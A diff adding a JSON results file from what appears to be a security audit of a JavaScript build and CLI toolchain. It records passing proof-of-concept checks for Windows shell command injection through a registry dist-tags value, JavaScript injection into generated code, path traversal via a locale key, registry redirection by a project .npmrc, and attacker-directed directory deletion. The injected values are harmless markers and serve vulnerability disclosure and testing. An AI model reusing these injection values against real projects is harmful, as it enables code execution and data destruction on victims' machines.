@@ -1,0 +1,65 @@
+[
+  {
+    "step": "H1a-real-http",
+    "expected": "GET /attacker-pkg in registry.log; raw value \"1.0.0\\\" & echo W1-MARKER>%TEMP%\\\\w1-poc & \\\"\" consumed by npm",
+    "actual": "logHit=true rawConsumed=true metaErr=null",
+    "pass": true,
+    "extra": "npm view fetched the packument from the repo-configured registry and resolved the RAW dist-tags value (E404 names it verbatim = unvalidated)"
+  },
+  {
+    "step": "H7-npmrc-native-redirect",
+    "expected": "repo .npmrc alone (no flag) redirects npm to the attacker registry; raw value consumed",
+    "actual": "freshHit=true rawNative=true payloadInNative=true registry=http://127.0.0.1:48731/",
+    "pass": true,
+    "extra": "PM-native precedence verified: npm honors the project .npmrc from cwd silently; the CLI/`npm view` receives no registry argument (C1A)."
+  },
+  {
+    "step": "H1b-yarnclassic-wrap",
+    "expected": "manifest specifier carries raw dist-tags value",
+    "actual": "rawInCommand=true cmd=info --json --verbose \"attacker-pkg@1.0.0\" & echo W1-MARKER>%TEMP%\\w1-poc & \"\"",
+    "pass": true,
+    "extra": "the value the win32 shell:string would receive (host.ts:157-164 shell:true)"
+  },
+  {
+    "step": "H1c-posix-noexec",
+    "expected": "no W1 marker on POSIX (array spawn, safe)",
+    "actual": "marker=false",
+    "pass": true,
+    "extra": "cmd.exe execution is the Windows-only rung"
+  },
+  {
+    "step": "H2-m3-delete",
+    "expected": "victim-out marker deleted",
+    "actual": "marker=false",
+    "pass": true,
+    "extra": "deleteOutputDir ran at build start (legacy browser builder)"
+  },
+  {
+    "step": "H3-d2-purge",
+    "expected": "stale sibling under attacker-chosen base DELETED (current kept)",
+    "actual": "staleGone=true currentKept=true",
+    "pass": true,
+    "extra": "purgeStaleBuildCache fires on every default build; base outside the workspace -> arbitrary stale-dir deletion"
+  },
+  {
+    "step": "H4-e1c1-escape",
+    "expected": "locale-key subPath writes OUTSIDE the output base",
+    "actual": "subPath=../../escaped-locale resolved=/tmp/escaped-locale outsideBase=true written=true",
+    "pass": true,
+    "extra": "locale KEY unvalidated -> default subPath (webpack stack write escape); the ../../ key lands two levels above the output base"
+  },
+  {
+    "step": "H5-d1-codegen",
+    "expected": "generated file carries D1-MARKER",
+    "actual": "present=true",
+    "pass": true,
+    "extra": "route=\"x\\\"));console.log(\\\"D1-MARKER\\\");//\" (workspace schematics-defaults channel, no --route flag)"
+  },
+  {
+    "step": "H6-caseguard",
+    "expected": "root contents deleted (case-insensitive fs)",
+    "actual": "ci=true deleted=true guard=threw",
+    "pass": true,
+    "extra": "control: exact root throws; variant bypasses the case-sensitive === guard"
+  }
+]
